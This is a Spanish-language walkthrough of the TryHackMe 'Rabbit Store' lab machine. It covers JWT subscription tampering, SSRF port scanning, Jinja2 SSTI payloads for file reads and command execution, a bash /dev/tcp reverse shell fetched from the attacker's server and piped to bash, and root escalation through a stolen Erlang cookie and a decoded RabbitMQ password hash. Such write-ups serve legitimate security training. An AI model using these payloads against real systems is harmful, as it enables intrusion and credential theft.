---
layout: single
title: TryHackMe - Rabbit Store
excerpt: "Rabbit Store es una máquina media de Try Hack Me donde se explota una api para obtener acceso privilegiado a un sistema donde pueden cargarse archivos, apartir de aqui se explota un SSRF para obtener un endpoint de la api en especifico, posteriormente se explota un SSTI que permite la ejecución remota de comandos, para la escalación de privilegios se comunica con rabbitqm para obtener la ocntraseña del root"
date: 2025-10-07
classes: wide
header:
  teaser: /assets/images/thm-writeup-RabbitStore/rabbit.png
  teaser_home_page: true
  icon: /assets/images/thm.png 
categories:
  - TryHackMe
  - Web Pentesting
tags:  
  - Linux
  - SSRF
  - API
  - SSTI 
  - Rabbitmq
  - epmd 


---
<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #0b101b;
    font-family: Arial, sans-serif;
    color: white;
  }

  /* Centramos únicamente los elementos visuales */
  .glitch,
  .title,
  .date,
  .info {
    text-align: center;
    margin-left: auto;
    margin-right: auto;
  }

  .glitch {
    position: relative;
    width: 90%;
    max-width: 400px;
    height: 300px;
    background-image: url("/assets/images/thm-writeup-RabbitStore/rabbit.png");
    background-size: cover;
    background-position: center;
    margin: 2rem auto 1rem auto;
    overflow: hidden;
  }

  .glitch:before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/thm-writeup-RabbitStore/rabbit.png");
    background-size: cover;
    background-position: center;
    opacity: 0.5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

  .glitch:hover:before {
    animation: glitch1 1s linear infinite;
  }

  @keyframes glitch1 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 5px 0; }
    20% { background-position: -5px 0; }
    30% { background-position: 15px 0; }
    40% { background-position: -5px 0; }
    50% { background-position: -25px 0; }
    60% { background-position: -50px 0; }
    70% { background-position: 0 -20px; }
    80% { background-position: -60px -20px; }
    81% { background-position: 0 0; }
    100% { background-position: 0 0; filter: hue-rotate(360deg); }
  }

  @keyframes glitch2 {
    0% { background-position: 0 0; filter: hue-rotate(0deg); }
    10% { background-position: 15px 0; }
    15% { background-position: -15px 0; }
    20% { filter: hue-rotate(360deg); }
    25% { background-position: 0 0; filter: hue-rotate(0deg); }
    100% { background-position: 0 0; filter: hue-rotate(0deg); }
  }

  .title {
    font-size: 1.5rem;
    font-weight: bold;
    margin-bottom: 0.5rem;
  }

  .date {
    font-size: 1rem;
    color: #ccc;
    margin-bottom: 1rem;
  }

  .info {
    display: flex;
    justify-content: center;
    gap: 2rem;
    flex-wrap: wrap;
    margin-top: 1rem;
    font-size: 0.9rem;
  }

  .info div {
    text-align: center;
  }

  .info .label {
    color: #999;
    font-size: 0.8rem;
  }

  .icon {
    font-size: 2rem;
    color: #0f0;
    margin: 0.5rem 0;
  }

  /* Responsive */
  @media (max-width: 575.5px) {
    .glitch {
      height: 200px;
    }
    .title {
      font-size: 1.3rem;
    }
  }
</style>

<body>
    <div class="glitch">  
    </div>
</body>

<br>

`Rabbit Store` Es una máquina maquina media de Try Hack Me donde se explota una api para obtener acceso privilegiado a un sistema donde pueden cargarse archivos, apartir de aqui se explota un SSRF para obtener un endpoint de la api en especifico, posteriormente se explota un SSTI que permite la ejecución remota de comandos, para la escalación de privilegios se comunica con rabbitqm para obtener la ocntraseña del root. 

## Enumeración

Realizando un escaneo de puertos TCP identifique los siguientes abiertos:

```bash
Nmap scan report for 10.201.90.204
Host is up, received user-set (0.23s latency).
Scanned at 2025-09-01 18:11:59 EDT for 145s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 61 Apache httpd 2.4.52
4369/tcp  open  epmd    syn-ack ttl 61 Erlang Port Mapper Daemon
25672/tcp open  unknown syn-ack ttl 61
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Realicé otro escaneo con **Nmap** utilizando la opción `-sVC` para obtener información detallada de los servicios detectados, y logré identificar un dominio `cloudsite.thm` 

```bash
Nmap scan report for 10.201.90.204
Host is up, received user-set (0.24s latency).
Scanned at 2025-09-01 18:15:35 EDT for 151s

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBXuyWp8m+y9taS8DGHe95YNOsKZ1/LCOjNlkzNjrnqGS1sZuQV7XQT9WbK/yWAgxZNtBHdnUT6uSEZPbfEUjUw=
|   256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcGp6ztslpYtKYBl8IrBPBbvf3doadnd5CBsO+HFg5M
80/tcp    open  http    syn-ack ttl 61 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
4369/tcp  open  epmd    syn-ack ttl 61 Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown syn-ack ttl 61
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumeración WEB 

El sitio web de la máquina es el siguiente:

![](/assets/images/thm-writeup-RabbitStore/web.png)

Lo primero que realicé fue revisar las tecnologías implementadas con Wappalyzer.

![](/assets/images/thm-writeup-RabbitStore/wa.png)

Realicé un escaneo de archivos y directorios, pero no encontré ninguno interesante.

```bash
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://cloudsite.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cloudsite.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 18451]
/.html                (Status: 403) [Size: 278]
/blog.html            (Status: 200) [Size: 10939]
/services.html        (Status: 200) [Size: 9358]
/contact_us.html      (Status: 200) [Size: 9914]
/assets               (Status: 301) [Size: 315] [--> http://cloudsite.thm/assets/]
/about_us.html        (Status: 200) [Size: 9992]
/javascript           (Status: 301) [Size: 319] [--> http://cloudsite.thm/javascript/]
```
Al acceder al login encontré otro subdominio, así que lo agregué a /etc/hosts para que el inicio de sesión cargara correctamente.

![](/assets/images/thm-writeup-RabbitStore/burp.png)

```bash
┌──(root㉿kali)-[/home/kali]
└─# cat /etc/hosts                                                                                         
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.201.6.196   cloudsite.thm storage.cloudsite.thm
```
![](/assets/images/thm-writeup-RabbitStore/login.png)

Intente ingresar con credenciales por defecto pero no tuve éxito, así que cree una cuenta y pude ingresar al portal, si embargo, me encontré con un mensaje indicando este servicio es solo para usuarios internos de la organización  y sus clientes, si es cliente solicite al administrador que active su suscripción.

![](/assets/images/thm-writeup-RabbitStore/mensaje.png)

Al capturar la petición de autenticación, observé que el sitio usa una API y que, tras autenticarse, devuelve un JSON Web Token (JWT) para el usuario.

![](/assets/images/thm-writeup-RabbitStore/auth.png)

Al analizar el token en jwt.io, observé que incluye el atributo suscripción con el valor inactivo.

![](/assets/images/thm-writeup-RabbitStore/jwt.png)

En ese punto capturé la petición de registro, añadiendo el atributo suscripción con valor activo.

![](/assets/images/thm-writeup-RabbitStore/subs.png)

Esto me permitió ingresar al dashboard con la suscripción activada, donde hay una funcionalidad para la carga de archivos.

![](/assets/images/thm-writeup-RabbitStore/up.png)

Realicé otro escaneo de directorios a partir de la ruta api para encontrar otros endpoints.

```bash
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://storage.cloudsite.thm/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://storage.cloudsite.thm/api/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 405) [Size: 36]
/register             (Status: 405) [Size: 36]
/docs                 (Status: 403) [Size: 27]
/uploads              (Status: 401) [Size: 32]
/Login                (Status: 405) [Size: 36]
/Docs                 (Status: 403) [Size: 27]
/Register             (Status: 405) [Size: 36]
```
Encontré algunos endpoints; sin embargo, aún no tengo acceso a ellos.

![](/assets/images/thm-writeup-RabbitStore/denied.png)

## SSRF (Server Side Request Forgery

En este punto intenté subir distintos tipos de archivo, pero no parece vulnerable. Más abajo hay otra sección para subir archivos mediante una URL.

![](/assets/images/thm-writeup-RabbitStore/url.png)

Realicé una prueba con un servidor temporal en Python, ingresando mi IP y llamando el archivo test.txt; la petición se obtuvo correctamente, lo que indica un posible SSRF (Server-Side Request Forgery).

![](/assets/images/thm-writeup-RabbitStore/test.png)

```bash
┌──(root㉿kali)-[/opt]
└─# python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.201.51.132 - - [02/Sep/2025 02:19:31] "GET /test.txt HTTP/1.1" 200 -
```

Algo que puede realizarse mediante un SSRF es una enumeración de puertos internos del sistema, primero genere una lista con los 65535 puertos

```bash
┌──(root㉿kali)-[/home/kali]
└─# for port in {1..65535};do echo $port >> ports.txt;done
```
Después realice una consulta a un puerto interno aleatorio que no esta abierto para ver el tamaño de la consulta cuando se realiza a puertos cerrados

```bash
┌──(root㉿kali)-[/home/kali]
└─# curl -i -s -X POST http://storage.cloudsite.thm/api/store-url -H "Content-Type: application/json" -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InBycmluQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTcxNzI5OTYsImV4cCI6MTc1NzE3NjU5Nn0.sqKdS7MF3rkp19X5dQlcT-kD2agDOuB_nKCC4JOnJc8" -d '{"url":"http://127.0.0.1:1"}'

HTTP/1.1 500 Internal Server Error
Date: Sat, 06 Sep 2025 15:42:11 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 41
ETag: W/"29-PsnbPRd1d0rezAmECVr7DoWSn4c"
Connection: close

{"message":"Error storing file from URL"} 
```

El contenido a consultas donde el puerto esta cerrado es `41`, con ffuf realice un escaneo excluyendo las solicitudes con ese numero para poder enumerar puertos abiertos internos.

```bash
┌──(root㉿kali)-[/home/kali]
└─# ffuf -w ./ports.txt:PORT -u http://storage.cloudsite.thm/api/store-url -X POST -H "Content-Type: application/json" -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InBycmluQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTcxNzI5OTYsImV4cCI6MTc1NzE3NjU5Nn0.sqKdS7MF3rkp19X5dQlcT-kD2agDOuB_nKCC4JOnJc8" -d '{"url":"http://127.0.0.1:PORT"}' -fs 41

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://storage.cloudsite.thm/api/store-url
 :: Wordlist         : PORT: /home/kali/ports.txt
 :: Header           : Content-Type: application/json
 :: Header           : Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InBycmluQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTcxNzI5OTYsImV4cCI6MTc1NzE3NjU5Nn0.sqKdS7MF3rkp19X5dQlcT-kD2agDOuB_nKCC4JOnJc8
 :: Data             : {"url":"http://127.0.0.1:PORT"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 41
________________________________________________

80                      [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 351ms]
3000                    [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 320ms]
8000                    [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 335ms]
```
Mediante el SSRF intenté consultar el endpoint docs, pero el puerto 80 no era el endpoint de la API.

![](/assets/images/thm-writeup-RabbitStore/docs.png)

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cat acb0a77e-3870-4a67-af69-8f02f6a813c1 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at cloudsite.thm Port 80</address>
</body></html>
```
Como la maquina tiene el puerto 3000 abierto internamente, intente hacer la petición a ese puerto en lugar del puerto 80 y obtuve el siguiente archivo:

![](/assets/images/thm-writeup-RabbitStore/98f.png)

```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cat 98f18667-f289-40a3-ab0b-e46e694a674c 
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```
Realicé una petición al endpoint api/fetch_messeges_from_chatbot, pero obtuve el error: el método GET no está permitido.

![](/assets/images/thm-writeup-RabbitStore/GET.png)

Al cambiar la solicitud a método POST, obtuve otro error.

![](/assets/images/thm-writeup-RabbitStore/POST.png)

El error se debe a que no se está enviando ningún dato y el formato no es JSON; al cambiar el Content-Type y enviar una cadena vacía, obtuve el mensaje: el parámetro username es requerido.

![](/assets/images/thm-writeup-RabbitStore/parametro.png)

## SSTI (Server Side Template Injection)


Todo lo que se introduce en el parámetro `username` se refleja en la respuesta así que probé un payload de SSTI `${{<%[%'\"}}%\\."` lo que provoco un error en le motor de plantillas 

![](/assets/images/thm-writeup-RabbitStore/ssti.png)

También puede probarse el payload: `(<{{;/*` el cual revela el nombre del usuario de la máquina

![](/assets/images/thm-writeup-RabbitStore/az.png)

Esto confirma una vulnerabilidad SSTI: envié {{7*7}} y la plantilla lo evaluó, devolviendo 49. 

![](/assets/images/thm-writeup-RabbitStore/49.png)

En este punto probé un payload para leer /etc/passwd, el cual funcionó correctamente.

Payload:

```bash
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}`
```

`NOTA:` En JSON, las comillas dobles dentro de una cadena deben ir escapadas (`\"`).

![](/assets/images/thm-writeup-RabbitStore/passwd.png)

Intenté buscar llaves RSA de SSH para los usuarios azrael y root, pero no encontré ninguna, por lo que ejecuté un payload para ejecutar comandos.

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![](/assets/images/thm-writeup-RabbitStore/id.png)

Para obtener una reverse shell cree un archivo llamado r con el sig. contenido:

```bash
┌──(root㉿kali)-[/opt]
└─# cat r         
#!/bin/bash

bash -i >& /dev/tcp/10.14.109.18/443 0>&1
```
Levanté un servidor temporal con Python y llamé a mi archivo agregando al final | bash para que se ejecutara.

![](/assets/images/thm-writeup-RabbitStore/bash.png)

```bash
┌──(root㉿kali)-[/opt]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.201.3.199 - - [07/Sep/2025 10:36:20] "GET /r HTTP/1.1" 200 -
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.14.109.18] from cloudsite.thm [10.201.3.199] 53594
bash: cannot set terminal process group (606): Inappropriate ioctl for device
bash: no job control in this shell
azrael@forge:~/chatbotServer$    
```
Para trabajar mas cómodo realice un tratamiento de la TTY

```bash
azrael@forge:~/chatbotServer$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
azrael@forge:~/chatbotServer$ ^Z
zsh: suspended  nc -lvp 443

┌──(root㉿kali)-[/home/kali]
└─# stty raw -echo;fg    
[1]  + continued  nc -lvp 443
                             reset 
reset: unknown terminal type unknown
Terminal type? xterm

azrael@forge:~/chatbotServer$ export TERM=xterm
azrael@forge:~/chatbotServer$ export SHELL=bash
azrael@forge:~/chatbotServer$ 
```
## Escalada de Privilegios

Enumerando los procesos con pspy, vi un proceso que valida cuánto espacio en disco queda disponible en el directorio donde RabbitMQ guarda su base de datos.

![](/assets/images/thm-writeup-RabbitStore/ps.png)

En el `/etc/passwd` hay un usuario que se llama`rabbitmq`

RabbitMQ es un software de colas de mensajes donde se definen colas a las que se conectan las aplicaciones para transferir uno o más mensajes. Para explotarlo seguí el sig. enlace [Pentesting Erlang Port Mapper Daemon (epmd)](https://book.hacktricks.wiki/en/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html#erlang-cookie-rce)
Básicamente debe encontrarse la cookie de autenticación para poder ejecutar código en el host, por lo regular suele estar en el **home** del usuario que corre Erlang/OTP: `~/.erlang.cookie`, sin embargo para encontrarla use el sig. comando:

RabbitMQ es un software de colas de mensajes donde se definen colas a las que se conectan las aplicaciones para transferir uno o más mensajes. Para explotarlo seguí el sig. enlace [Pentesting Erlang Port Mapper Daemon (epmd)](https://book.hacktricks.wiki/en/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html#erlang-cookie-rce)
Básicamente debe encontrarse la cookie de autenticación para poder ejecutar código en el host, por lo regular suele estar en el **home** del usuario que corre Erlang/OTP: `~/.erlang.cookie`, sin embargo para encontrarla use el sig. comando:

```bash
find / -name ".erlang.cookie" -type f -print -exec ls -l {} \; 2>/dev/null
 ```

```bash
azrael@forge:/$ find / -name ".erlang.cookie" -type f -print -exec ls -l {} \; 2>/dev/null

/var/lib/rabbitmq/.erlang.cookie
-r-----r-- 1 rabbitmq rabbitmq 16 Oct  6 23:17 /var/lib/rabbitmq/.erlang.cookie
azrael@forge:/$ 
```
Ahora que conozco la ruta de la cookie, puedo ver su contenido.

```bash
azrael@forge:~/chatbotServer$ cat /var/lib/rabbitmq/.erlang.cookie; echo
Z4l1ZmrrOY0kgNZS
azrael@forge:~/chatbotServer$ 
```
Usando esta cookie puedo autenticarme y comunicarme con el nodo RabbitMQ. Los nodos RabbitMQ usan el formato rabbit@hostname, así que añadí forge a mi archivo /etc/hosts.

```bash
azrael@forge:~/chatbotServer$ HOME=/ erl -sname p3rr1n -setcookie Z4l1ZmrrOY0kgNZS
Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]

Eshell V12.2.1  (abort with ^G)
(p3rr1n@forge)1>
```
Posteriormente use la herramienta rabbitmqctl y la cookie  para ver el estado del nodo

```bash
┌──(root㉿kali)-[/home/kali]
└─# rabbitmqctl --erlang-cookie 'Z4l1ZmrrOY0kgNZS' --node rabbit@forge status
Status of node rabbit@forge ...
[]
Runtime

OS PID: 1239
OS: Linux
Uptime (seconds): 4564
Is under maintenance?: false
RabbitMQ version: 3.9.13
RabbitMQ release series support status: see https://www.rabbitmq.com/release-information
Node name: rabbit@forge
Erlang configuration: Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]
Crypto library: 
Erlang processes: 371 used, 1048576 limit
Scheduler run queue: 1
Cluster heartbeat timeout (net_ticktime): 60
...SNIP...
```
Luego enumeré los usuarios y me encontré con una nota interesante.

```bash
┌──(root㉿kali)-[/home/kali]
└─#  rabbitmqctl --erlang-cookie 'Z4l1ZmrrOY0kgNZS' --node rabbit@forge list_users
Listing users ...
user    tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.      []
root    [administrator]
```

Para obtener el hash ejecute el siguiente comando:

```bash
┌──(root㉿kali)-[/home/kali]
└─# rabbitmqctl --erlang-cookie 'Z4l1ZmrrOY0kgNZS' --node rabbit@forge export_definitions /tmp/rabbit_defs.json --format json 
Exporting definitions in JSON to a file at "/tmp/rabbit_defs.json" ...
                       
┌──(root㉿kali)-[/home/kali]
└─# cat /tmp/rabbit_defs.json | jq
{
  "bindings": [],
  "permissions": [
    {
      "configure": ".*",
      "read": ".*",
      "user": "root",
      "vhost": "/",
      "write": ".*"
    }
  ],
  "queues": [
    {
      "arguments": {},
      "auto_delete": false,
      "durable": true,
      "name": "tasks",
      "type": "classic",
      "vhost": "/"
    }
  ],
  "parameters": [],
  "policies": [],
  "rabbitmq_version": "3.9.13",
  "exchanges": [],
  "global_parameters": [
    {
      "name": "cluster_name",
      "value": "rabbit@forge"
    }
  ],
  "rabbit_version": "3.9.13",
  "topic_permissions": [
    {
      "exchange": "",
      "read": ".*",
      "user": "root",
      "vhost": "/",
      "write": ".*"
    }
  ],
  "users": [
    {
      "hashing_algorithm": "rabbit_password_hashing_sha256",
      "limits": {},
      "name": "The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.",                                                                                                  
      "password_hash": "vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K",
      "tags": []
    },
    {
      "hashing_algorithm": "rabbit_password_hashing_sha256",
      "limits": {},
      "name": "root",
      "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
      "tags": [
        "administrator"
      ]
    }
  ],
  "vhosts": [
    {
      "limits": [],
      "metadata": {
        "description": "Default virtual host",
        "tags": []
      },
      "name": "/"
    }
  ]
}
       
```

El hash que recibimos está en **base64** y según la [documentación de RabbitMQ](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm) , sigue la estructura: **`base64(<4 byte salt> + sha256(<4 byte salt> + <password>))`**.

Para recuperar el hash, utilice los siguientes comandos:

```bash
┌──(root㉿kali)-[/home/kali]
└─# b64="49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF"
hex=$(echo -n "$b64" | base64 -d | xxd -p -c 100)
echo "hex completo: $hex"
salt_hex=${hex:0:8}
hash_hex=${hex:8}
echo "salt (hex): $salt_hex"
echo "sha256 (hex): $hash_hex"

hex completo: e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
salt (hex): e3d7ba85
sha256 (hex): 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

Finalmente, utilice el hash sha256 como contraseña para el usuario root 

```bash
azrael@forge:~/chatbotServer$ su
Password: 
root@forge:/home/azrael/chatbotServer# whoami
root
root@forge:/home/azrael/chatbotServer# 
```
